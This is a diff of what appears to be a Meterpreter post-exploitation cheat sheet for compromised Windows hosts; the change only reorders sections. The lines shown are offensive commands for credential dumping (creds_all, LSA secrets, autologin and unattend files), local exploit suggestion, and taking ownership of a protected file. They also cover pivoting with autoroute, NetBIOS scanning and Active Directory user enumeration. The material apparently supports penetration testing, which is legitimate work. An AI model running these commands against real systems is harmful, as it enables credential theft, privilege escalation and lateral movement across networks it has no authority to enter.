@@ -960,12 +960,16 @@ powershell_execute "Get-ScheduledTask | Where-Object {($_.Author -notmatch 'Micr
 powershell_execute "$task = Get-ScheduledTask -TaskName 'Ownership'; $task.Actions; $task.Triggers; $task.Settings; $task; $filePath = $task.Actions.Execute; Get-Acl $filePath | Select-Object PSChildName, PSPath, AccessToString"
 powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"
 
++---------- Network Environment ----------+
+powershell_execute "powershell -c \"& { Get-NetTCPConnection -State Listen,Established | Where-Object { `$_."LocalAddress" -notin @('0.0.0.0','127.0.0.1') -and `$_."RemoteAddress" -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize }\""
+powershell_execute "arp"
+powershell_execute "route print"
+run post/multi/manage/autoroute
+run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
+ifconfig
+
 +---------- Exploit Suggester ----------+
 run multi/recon/local_exploit_suggester
-
-+---------- File Permissions ----------+
-powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
-powershell_execute "takeown /f 'C:\secret.txt' && icacls 'C:\secret.txt' /grant %USERNAME%:F /inheritance:e"
 
 +---------- Dumping ----------+
 creds_all
@@ -978,13 +982,9 @@ run post/windows/gather/lsa_secrets
 run post/windows/gather/enum_unattend
 run post/windows/gather/credentials/windows_autologin
 
-+---------- Network Environment ----------+
-powershell_execute "Get-NetTCPConnection -State Listen,Established | Where-Object { $_.LocalAddress -notin '0.0.0.0', '127.0.0.1' -and $_.RemoteAddress -notmatch '::' } | Sort-Object LocalAddress,LocalPort | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table -AutoSize"
-powershell_execute "arp"
-powershell_execute "route print"
-run post/multi/manage/autoroute
-run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
-ifconfig
++---------- File Permissions ----------+
+powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
+powershell_execute "takeown /f 'C:\secret.txt' && icacls 'C:\secret.txt' /grant %USERNAME%:F /inheritance:e"
 
 +---------- Domain Environment ----------+
 run post/windows/gather/enum_ad_users
